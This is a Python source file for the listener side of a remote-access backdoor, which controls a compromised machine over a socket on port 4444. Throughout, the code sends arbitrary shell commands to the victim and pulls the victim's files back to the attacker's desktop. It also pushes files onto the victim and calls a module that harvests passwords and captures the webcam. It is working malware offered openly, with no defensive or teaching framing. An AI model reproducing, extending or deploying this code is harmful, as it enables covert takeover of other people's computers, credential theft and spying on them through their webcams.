#!/usr/bin/python
import subprocess, datetime, base64, socket, json, time, sys
from EAV import eav

class BackdoorServer:
	def __init__(self, ip, port):
		try:
			listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			listener.bind((ip, port))
			listener.listen(0)
			subprocess.call("clear",shell=True)
			print("\033[94m [+] \033[39mListening for incoming connections...")
			self.connection, address = listener.accept()
			print("\033[92m [+] \033[39mEstablishing a connection to " + str(address[0]))
			print("___________________________________________________________________\n")
		except:
			print("\033[91m [+] \033[39mFailure to establish a connection")

	def send_data(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def recv_data(self):
		json_data = ""
		while(1):
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				pass

	def read_file(self, path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path,'wb') as file:
			file.write(base64.b64decode(content))

	def execute_attack_vector(self, vector):
		_eav = eav.EAV(self.connection)
		if vector == "passwords":
			_eav.passwords()
		if vector == "webcam":
			_eav.webcam()
		if vector == "options":
			_eav.options()

	def run_cmd(self, cmd):
		if cmd[0] == "exit":
			self.send_data(cmd)
			self.close_connection()
		elif cmd[0] == "clear":
			subprocess.call("clear", shell=True)
		elif cmd[0] == "ls":
			self.send_data(["dir"])
			print(self.recv_data())
		elif cmd[0] == "download" and len(cmd) > 1:
			self.send_data(cmd)
			result = self.recv_data()
			if "Error running command" not in result:
				self.write_file("/root/Desktop/Backdoor-Tools/backdoor_downloads/"+cmd[1].split("\\")[-1], result)
				print("\033[94m [+] \033[39mFile written to: /root/Desktop/Backdoor-Tools/backdoor_downloads/"+cmd[1].split("\\")[-1]+"\n")
			else:
				print(result)
		elif cmd[0] == "upload" and len(cmd) > 1:
			try:
				content = self.read_file(cmd[1])
				cmd.append(content)
				self.send_data(cmd)
				print(self.recv_data())
			except:
				print("\033[91m [+] \033[39mInvalid path\n")
		elif cmd[0] == "EAV" and len(cmd) > 1:
			try:
				self.execute_attack_vector(cmd[1])
			except:
				print("\033[91m [+] \033[39mError executing attack vector \'"+cmd[1]+"\'\n")
		else:
			self.send_data(cmd)
			print(self.recv_data())

	def close_connection(self):
		print("\033[94m [+] \033[39m Closing connection...\n")
		self.send_data("exit")
		self.connection.close()
		exit()

	def execute(self):
		while(1):
			try:
				command = raw_input(">> ").split(" ")
				self.run_cmd(command)
			except KeyboardInterrupt:
				self.run_cmd(["exit"])
				break

if __name__== "__main__":
	listener = BackdoorServer("10.0.1.4", 4444)
	listener.execute()
